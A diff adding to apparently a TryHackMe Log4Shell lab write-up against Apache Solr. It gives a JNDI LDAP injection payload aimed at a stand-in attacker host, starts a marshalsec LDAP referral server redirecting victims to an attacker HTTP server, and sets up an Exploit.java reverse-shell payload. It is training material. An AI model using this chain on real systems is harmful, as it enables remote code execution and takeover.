@@ -108,3 +108,81 @@ curl 'http://10.10.253.236:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKE
 ![image](https://user-images.githubusercontent.com/95479102/146321410-c46cd0f1-26c2-47f6-8655-f70ff50b7618.png)
 
 
+
+At this point, you have verified the target is in fact vulnerable by seeing this connection caught in your netcat listener. However, it made an LDAP request... so all your netcat listener may have seen was non-printable characters (strange looking bytes). We can now build upon this foundation to respond with a real LDAP handler.
+
+We will utilize a open-source and public utility to stage an "LDAP Referral Server". This will be used to essentially redirect the initial request of the victim to another location, where you can host a secondary payload that will ultimately run code on the target. This breaks down like so:
+
+    ${jndi:ldap://attackerserver:1389/Resource} -> reaches out to our LDAP Referral Server
+    LDAP Referral Server springboards the request to a secondary http://attackerserver/resource
+    The victim retrieves and executes the code present in http://attackerserver/resource
+
+This means we will need an HTTP server, which we could simply host with any of the following options (serving on port 8000):
+
+    python3 -m http.server
+    php -S 0.0.0.0:8000
+    (or any other busybox httpd or formal web service you might like)
+
+If you get stuck on any of the following steps, we have a video showcasing (using the AttackBox) each step to gain remote code execution: https://youtu.be/OJRqyCHheRE
+
+
+The first order of business however is obtaining the LDAP Referral Server. We will use the marshalsec utility offered at https://github.com/mbechler/marshalsec
+
+![image](https://user-images.githubusercontent.com/95479102/146742247-ac5c9d8a-658e-4a0a-8f6f-b2167f8f05db.png)
+
+Ultimately, this needs to run Java. Reviewing the README for this utility, it suggests using Java 8. (You may or may not have success using a different version, but to "play by the rules," we will match the same version of Java used on the target virtual machine)
+
+If you are using the TryHackMe AttackBox, you do NOT need to follow the below steps - move onto the next question.
+See steps to installing Java 8 locally (follow only if not using AttackBox)
+
+If you are not running 1.8.0_181 within the attack box, you can review the update-alternatives --set steps below to switch to this Java 8 version.
+
+If you are using your own attacking machine connected to the VPN, you may need to download and install Java 1.8.0_181 with the steps below:
+
+You can find a mirror of different Java versions to run on Linux at this location. http://mirrors.rootpei.com/jdk/
+
+Select the jdk-8u181-linux-x64.tar.gz package (or alternatively, download the file attached to this task, added for your convenience).
+
+Download this into your attacking machine, and run the following commands to configure your system to use this Java version by default (adjust the download filesystem path as appropriate):
+
+sudo mkdir /usr/lib/jvm 
+
+cd /usr/lib/jvm
+
+sudo tar xzvf ~/Downloads/jdk-8u181-linux-x64.tar.gz    # modify as needed
+
+sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1
+sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1
+sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1
+
+sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
+sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
+sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws
+
+![image](https://user-images.githubusercontent.com/95479102/146745208-681b50f5-2f77-419f-80de-c12190124dd5.png)
+
+After you have downloaded, extracted, and set the appropriate filesystem settings (the update-alternatives syntax) above, you should be able to run java -version and verify you are in fact now running Java 1.8.0_181.
+
+![image](https://user-images.githubusercontent.com/95479102/146748070-4500f33f-22c0-4198-85a8-ae1f39343911.png)
+
+We must build marshalsec with the Java builder maven. If you do not yet have maven on your system, you can install it through your package manager (not needed if you're using the AttackBox): sudo apt install maven
+
+Next, run the command to build the marshalsec utility:
+
+![image](https://user-images.githubusercontent.com/95479102/146745721-6514afec-ec20-4012-ad71-5de69107f717.png)
+
+![image](https://user-images.githubusercontent.com/95479102/146746033-b000e687-7d3d-4d4a-a01e-86a50b65a010.png)
+
+With the marshalsec utility built, we can start an LDAP referral server to direct connections to our secondary HTTP server (which we will prepare in just a moment). You are more than welcome to dig into the usage, parameters and other settings that can be configured with this tool -- but for the sake of demonstration, the syntax to start the LDAP server is as follows:
+
+java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"
+
+Now that our LDAP server is ready and waiting, we can open a second terminal window to prepare and our final payload and secondary HTTP server.
+
+Ultimately, the log4j vulnerability will execute arbitrary code that you craft within the Java programming language. If you aren't familiar with Java, don't fret -- we will use simple syntax that simply "shells out" to running a system command. In fact, we will retrieve a reverse-shell connection so we can gain control over the target machine!
+
+Create and move into a new directory where you might host this payload. First, create your payload in a text editor of your choice (mousepad, nano, vim, Sublime Text, VS Code, whatever), with the specific name Exploit.java:
+
+![image](https://user-images.githubusercontent.com/95479102/146746718-74d29e4f-b6ff-4e9e-9b86-8ca3a3b7caf3.png)
+
+
